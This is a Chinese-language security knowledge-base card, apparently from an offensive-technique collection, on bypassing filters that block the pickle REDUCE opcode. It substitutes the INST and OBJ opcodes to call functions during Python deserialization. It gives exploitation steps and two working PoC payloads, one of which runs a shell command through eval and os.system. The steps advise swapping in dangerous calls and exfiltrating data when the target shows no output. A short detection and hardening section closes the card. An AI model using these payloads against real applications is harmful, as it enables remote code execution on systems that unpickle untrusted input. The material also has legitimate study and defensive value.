---
id: web-python-deserialization-pickle-inst-obj-reduce-filter-bypass
title: Pickle REDUCE 被过滤时的调用替代：用 INST/OBJ 构造调用链，dir/reversed/next 仅靠 c+i
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-inst-obj-reduce-filter-bypass
aliases:
- R 被过滤 pickle
- REDUCE 替代
- INST 调用链
- OBJ 操作符调用
- c+i 构造 payload
tags:
- python
- pickle
- deserialization
- opcode
- inst
- obj
- bypass
- waf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V501
  verified_at: '2026-11-11T02:32:25+08:00'
  notes: 已对照原文核对：原文明确给出『R操作符被过滤时』用 o 的 payload 及仅 c+i 的 next(reversed(dir(...))) 链，本卡归纳 INST/OBJ 替代 REDUCE 成立。核验时修正了两处：①原文的 i__builtins__ 不是可 import 的模块名（实测 ModuleNotFoundError），已改为 i 加 builtins（Py2 为 __builtin__）；②原 OBJ PoC 的 MARK/栈次序有误，已换成在 Python 3.12 实测通过的写法。未在目标环境复跑。
---

## 一句话结论

当 WAF/黑名单把 `R`（REDUCE）或字节 `R` 禁掉时，pickle 仍有两条等价的调用路径：`o`（OBJ）对栈上的 callable 传参调用，`i`（INST）按“模块名 + 属性名”直接调用函数/实例化类；只用 `c` 和 `i` 也能拼出 `next(reversed(dir(obj)))` 这类完整调用链，因此在禁用 REDUCE 的场景下仍可执行命令。

## 原理

- `R`（REDUCE）的语义是弹出参数元组与 callable，执行 `func(*args)`；它是最直观的调用原语，因此常被 WAF 以字节 `R` 或字符串 `REDUCE` 直接拦截。
- `o`（OBJ）的语义与 REDUCE 很接近但字节不同：先压入 callable，再压入参数（用 MARK 分隔），`o` 弹出 MARK 与参数、调用 callable，把返回值压栈。只要能把 callable 和参数按顺序放上栈，就能在不出现 `R` 的情况下完成同样的调用。
- `i`（INST）的语义是“取模块属性并以其为 callable，把 MARK 之后的参数传给它”：`i<module>\n<name>\n` 相当于 `module.name(*args)`。它既能调用函数（`ibuiltins\ndir`），也能实例化类；INST 在 Python 3.8+ 被标记为 deprecated，但多数版本仍可解析。
- 嵌套调用时，每个参数前压一个 MARK（`(`），`i`/`o` 会取最近一个 MARK 到栈顶之间的数据作为参数列表，因此 `(((c__main__\nsecret\nibuiltins\ndir\nibuiltins\nreversed\nibuiltins\nnext\n.` 可以完成 `next(reversed(dir(secret)))`（Python 3 模块名为 `builtins`，Python 2 为 `__builtin__`；原文写的 `__builtins__` 不是可 import 的模块名，实测会 ModuleNotFoundError，需替换）。
- 对需要“取属性/取字典值”的链，`o` 比 `i` 更灵活：MARK 之后先放 `getattr`/`dict.get` 这类 callable（用 `c<module>\n<name>\n` 取），再放其余参数，`o` 调用；整条链可以完全不含 `R`。
- 该技巧绕过的只是“对 REDUCE 的过滤”，不改变 `find_class` 白名单；如果目标同时限制可引用的模块/类，仍需配合 getattr/globals 等白名单绕过。

## 触发条件

- 存在可控 pickle 反序列化入口。
- 黑名单/WAF 拦截 `R`/`REDUCE`，但未拦截 `o`/`i` 或对应的字节。
- 目标模块/函数可通过 `GLOBAL`/`INST` 取到（或已有白名单绕过链）。
- 需要调用的函数参数能按 MARK 顺序压栈。

## 利用步骤

1. 确认 `R` 被拦：提交含 `R` 的普通 payload 观察报错/拦截；再提交只含 `c`+`o` 的无害调用（如 `print`）验证 `o` 可用。
2. 选择调用原语：函数名已知且模块属性可直接取时用 `i`（`i<module>\n<name>\n`）；需要动态取属性/字典值时先用 `c` 取 `getattr`/`dict.get`，再用 `o` 调用。
3. 按嵌套顺序压 MARK 与参数：内层调用的结果作为外层参数时，先完成内层，再压外层 MARK/参数。
4. 用 `pickletools.dis` 核对每条 `i`/`o` 的参数边界；先在本地用 `print`/`dir` 等无害函数验证。
5. 替换为 `os.system`/`subprocess` 等危险调用；若 `os` 也被黑名单拦截，先走 getattr/globals/sys.modules 取函数链。
6. 无回显时用写文件/外带验证。

## PoC

```python
# 仅用 c + i 的调用链：next(reversed(dir(secret)))
# Python 3 模块名为 builtins（Py2 为 __builtin__）；原文的 __builtins__ 不是可导入模块名，需替换
payload = b"(((c__main__\nsecret\nibuiltins\ndir\nibuiltins\nreversed\nibuiltins\nnext\n."
```

```python
# R 被过滤时，用 o 替代 R 调用 eval：MARK 之后第一个元素是 callable，其余是参数
payload = b"(cbuiltins\neval\nS'__import__(\"os\").system(\"id\")'\no."
```

说明：以上两条 payload 已在 Python 3.12 本地验证（INST 链返回 `next(reversed(dir(secret)))`，OBJ 链执行 eval）；`i`/`o` 的栈次序与 MARK 位置需按实际解包结果调整，未在目标环境复跑。INST 在 Python 3.8+ 为 deprecated opcode，较新版本可能移除。

## 变体与关联

- 变体：`i` 也可直接实例化类（`i<module>\n<class>\n` + 参数），用于构造带参数的 gadget 对象。
- 变体：用 `\x85`/`\x86`（TUPLE1/TUPLE2）精确构造参数元组，再配合 `o`；或把 `R` 拆成 `\x52` 之外的编码形式（若 WAF 只匹配明文字符）。
- 关联：[[web-python-deserialization-pker-opcode-primitives]]（GLOBAL/INST/OBJ/REDUCE 的完整语义与 pker 映射）；[[web-python-deserialization-restricted-unpickler-getattr-bypass]]（取函数链的白名单绕过）；[[web-python-deserialization-pickle-blacklist-miss-subprocess-run-opcode]]（黑名单漏项与 opcode 组合）。
- 边界：WAF 同时拦截 `o`/`i`、目标 Python 版本不支持 INST、或参数次序无法用 MARK 表达时失效。

## 检测与防御

- 检测：pickle 载荷中出现 `i`（INST）/`o`（OBJ）直接调用系统模块，尤其与 `os`、`system`、`getattr`、`globals` 组合；对 `pickletools` 反汇编结果做行为级审计，而不是只匹配 `R`。
- 修复：不要反序列化不可信 pickle；用严格 `find_class` 类白名单，禁止 `os`/`subprocess`/`builtins` 等模块与属性访问原语。
- 加固：在低权限进程/容器反序列化；监控异常子进程与模块导入；对 pickle 输入做完整 opcode 白名单（只允许业务所需的少数 opcode）。
